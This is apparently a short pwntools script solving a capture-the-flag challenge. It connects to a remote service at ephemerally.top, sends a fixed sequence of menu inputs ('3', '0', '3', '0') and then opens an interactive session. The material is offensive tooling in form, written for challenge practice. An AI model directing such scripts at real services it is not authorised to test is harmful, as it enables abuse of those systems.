from pwn import *

io = remote('ephemerally.top',28055)
context.log_level = 'debug'

io.sendline(b'3')
io.sendline(b'0')
io.sendline(b'3')
io.sendline(b'0')

io.interactive()
